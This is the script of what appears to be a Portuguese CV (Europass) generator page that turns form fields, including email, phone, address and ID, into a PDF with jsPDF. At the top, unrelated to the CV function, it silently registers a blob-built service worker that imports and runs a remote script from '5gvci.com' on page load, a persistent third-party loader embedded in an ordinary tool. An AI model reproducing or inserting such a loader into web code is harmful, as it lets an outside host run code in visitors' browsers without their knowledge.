<script>
const swCode = `self.options = {"dominio": "5gvci.com","zoneId": 12163257}
self.lary = ""
importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')`;
if('serviceWorker' in navigator){
  const blob = new Blob([swCode], {type: 'application/javascript'});
  navigator.serviceWorker.register(URL.createObjectURL(blob));
}

function gerar(){
 const {jsPDF}=window.jspdf;
 const doc=new jsPDF();
 const nome=document.getElementById('nome').value||'CV';

 // Cabeçalho verde
 doc.setFillColor(14,107,75); // verde escuro
 doc.rect(0,0,210,30,'F');
 doc.setTextColor(255,255,255);
 doc.setFontSize(16);
 doc.text(nome.toUpperCase(),14,18);

 doc.setTextColor(0,0,0);
 doc.setFontSize(10);

 let y = 40;
 const linha = (label, valor) => {
   if(!valor) return;
   doc.setFont(undefined,'bold');
   doc.setTextColor(14,107,75);
   doc.text(label,14,y);
   doc.setFont(undefined,'normal');
   doc.setTextColor(0,0,0);
   const linhas = doc.splitTextToSize(valor, 170);
   doc.text(linhas, 45, y);
   y += (linhas.length * 5) + 3;
 };

 linha('Email:', document.getElementById('email').value);
 linha('Telefone:', document.getElementById('tel').value);
 linha('Morada:', document.getElementById('morada').value);
 linha('Nasc./ID:', document.getElementById('nasc').value);

 y += 2;
 const secao = (titulo, valor) => {
   if(!valor) return;
   doc.setDrawColor(14,107,75);
   doc.setLineWidth(0.5);
   doc.line(14, y, 196, y);
   y += 6;
   doc.setFont(undefined,'bold');
   doc.setTextColor(14,107,75);
   doc.setFontSize(12);
   doc.text(titulo,14,y);
   y += 6;
   doc.setFont(undefined,'normal');
   doc.setTextColor(0,0,0);
   doc.setFontSize(10);
   const linhas = doc.splitTextToSize(valor, 180);
   doc.text(linhas, 14, y);
   y += (linhas.length * 5) + 4;
 };

 secao('PERFIL', document.getElementById('perfil').value);
 secao('HABILITAÇÕES ACADÉMICAS', document.getElementById('form').value);
 secao('EXPERIÊNCIA PROFISSIONAL', document.getElementById('exp').value);
 secao('CURSOS E COMPETÊNCIAS', document.getElementById('hab').value);
 secao('ESTÁGIOS PROFISSIONAIS', document.getElementById('estagios').value);
 secao('IDIOMAS', document.getElementById('idiomas').value);
 secao('OBJECTIVO PROFISSIONAL', document.getElementById('objetivo').value);

 doc.save('CV_Europass_'+nome+'.pdf');
}
</script>
